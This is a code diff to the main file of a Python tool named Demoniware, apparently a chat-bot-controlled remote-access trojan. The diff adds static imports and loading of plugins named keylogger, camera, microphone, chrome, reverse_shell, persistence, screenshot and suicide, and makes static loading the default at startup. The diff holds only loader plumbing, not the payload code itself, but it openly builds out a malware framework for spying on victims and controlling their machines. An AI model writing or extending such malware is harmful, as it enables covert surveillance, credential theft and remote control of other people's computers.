@@ -17,6 +17,7 @@ from Crypto.Hash import SHA256
 from threading import Thread
 
 from plugins import load_plugin
+from plugins import camera, chrome, download_upload, keylogger, microphone, persistence, proc, reverse_shell, screenshot, suicide, system
 
 
 class Demoniware(object):
@@ -59,26 +60,47 @@ class Demoniware(object):
 
         self.command_routes = {}
 
-    def load_plugins(self):
-        for p in self.plugin_list:
-            try:
-                self.logger.info('[*] Loading plugin: {}'.format(p))
-                self.plugins[p] = load_plugin(self, p)
-                new_cmd = []
+    def load_plugins(self, import_type='dynamic'):
+        if import_type == 'dynamic':
+            for p in self.plugin_list:
+                try:
+                    self.logger.info('[*] Loading plugin: {}'.format(p))
+                    self.plugins[p] = load_plugin(self, p)
+                    new_cmd = []
 
-                self.plugins[p].setup()
+                    self.plugins[p].setup()
 
-                for command in self.plugins[p].commands:
-                    if self.command_routes.get(command.name, None):
-                        self.logger.warning('[-] Duplicated command "{}" for plugins "{}" and "{}", prioritizing first'.format(command.name, self.command_routes[command.name], p))
-                    else:
-                        self.command_routes[command.name] = p
-                        new_cmd.append(command.name)
+                    for command in self.plugins[p].commands:
+                        if self.command_routes.get(command.name, None):
+                            self.logger.warning('[-] Duplicated command "{}" for plugins "{}" and "{}", prioritizing first'.format(command.name, self.command_routes[command.name], p))
+                        else:
+                            self.command_routes[command.name] = p
+                            new_cmd.append(command.name)
 
-                self.logger.info('[+] Plugin loaded: {} ({} @ {}), new commands: {}'.format(p, self.plugins[p].name, self.plugins[p].version, new_cmd))
-            except Exception as e:
-                self.logger.error('[-] Error loading plugin: {} ({})'.format(p, str(e)))
-                continue
+                    self.logger.info('[+] Plugin loaded: {} ({} @ {}), new commands: {}'.format(p, self.plugins[p].name, self.plugins[p].version, new_cmd))
+                except Exception as e:
+                    self.logger.error('[-] Error loading plugin: {} ({})'.format(p, str(e)))
+                    continue
+        elif import_type == 'static':
+            for m in [camera, chrome, download_upload, keylogger, microphone, persistence, proc, reverse_shell, screenshot, suicide, system]:
+                name = m.__name__.replace('plugins.', '')
+
+                try:
+                    self.logger.info('[*] Loading plugin: {}'.format(name))
+                    new_cmd = []
+                    self.plugins[name] = m.Main(self)
+                    self.plugins[name].setup()
+
+                    for command in self.plugins[name].commands:
+                        if self.command_routes.get(command.name, None):
+                            self.logger.warning('[-] Duplicated command "{}" for plugins "{}" and "{}", prioritizing first'.format(command.name, self.command_routes[command.name], name))
+                        else:
+                            self.command_routes[command.name] = name
+                            new_cmd.append(command.name)
+
+                        self.logger.info('[+] Plugin loaded: {} ({} @ {}), new commands: {}'.format(name, self.plugins[name].name, self.plugins[name].version, new_cmd))
+                except Exception as e:
+                    self.logger.error('[-] Error loading plugin: {} ({})'.format(name, str(e)))
 
     def send_message(self, chat_id, msg):
         chunks = textwrap.wrap(msg, width=self.max_message_length - 500, expand_tabs=False, replace_whitespace=False, drop_whitespace=False, break_long_words=True)
@@ -191,5 +213,5 @@ class Demoniware(object):
 if __name__ == "__main__":
 
     demon = Demoniware('demoniware.ini')
-    demon.load_plugins()
+    demon.load_plugins('static')
     demon.main()
